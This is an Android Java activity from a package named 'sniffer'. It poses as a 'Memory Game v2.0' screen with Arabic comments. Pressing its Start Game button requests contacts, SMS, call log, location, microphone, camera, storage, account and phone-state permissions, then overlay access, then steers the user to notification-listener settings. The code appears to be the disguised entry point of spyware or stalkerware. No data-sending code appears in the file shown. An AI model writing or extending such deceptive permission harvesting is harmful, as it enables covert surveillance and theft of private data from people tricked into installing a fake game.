package com.v8.global.sniffer;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // تصميم واجهة اللعبة برمجياً
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(0xFF121212);

        TextView title = new TextView(this);
        title.setText("Memory Game v2.0\nاضغط للبدء");
        title.setTextColor(0xFF00FF00);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 50);

        Button startBtn = new Button(this);
        startBtn.setText("Start Game");
        startBtn.setOnClickListener(v -> {
            // طلب الصلاحيات أولاً ثم توجيه لتفعيل الخدمة
            if (checkAndRequestPermissions()) {
                // إذا كانت الصلاحيات ممنوحة مسبقاً، نوجه لإعدادات الإشعارات
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            }
        });

        layout.addView(title);
        layout.addView(startBtn);
        setContentView(layout);
    }

    private boolean checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // قائمة الصلاحيات المطلوبة
            String[] permissions = {
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.CAMERA,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.GET_ACCOUNTS,
                    Manifest.permission.READ_PHONE_STATE
            };

            boolean allGranted = true;
            for (String perm : permissions) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (!allGranted) {
                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
                return false;
            }

            // التحقق من صلاحية SYSTEM_ALERT_WINDOW (النوافذ العائمة)
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
                Toast.makeText(this, "يرجى منح صلاحية النوافذ العائمة", Toast.LENGTH_LONG).show();
                return false;
            }

            return true;
        }
        return true; // للإصدارات الأقدم من Marshmallow
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                // بعد منح الصلاحيات، نوجه لإعدادات الإشعارات
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            } else {
                Toast.makeText(this, "بعض الصلاحيات مرفوضة، قد لا يعمل التطبيق بشكل صحيح", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // عند العودة من إعدادات الصلاحيات، نتحقق إذا كانت جميع الصلاحيات ممنوحة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
                    Settings.canDrawOverlays(this)) {
                // الصلاحيات ممنوحة، يمكن توجيه لإعدادات الإشعارات
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            }
        }
    }
}
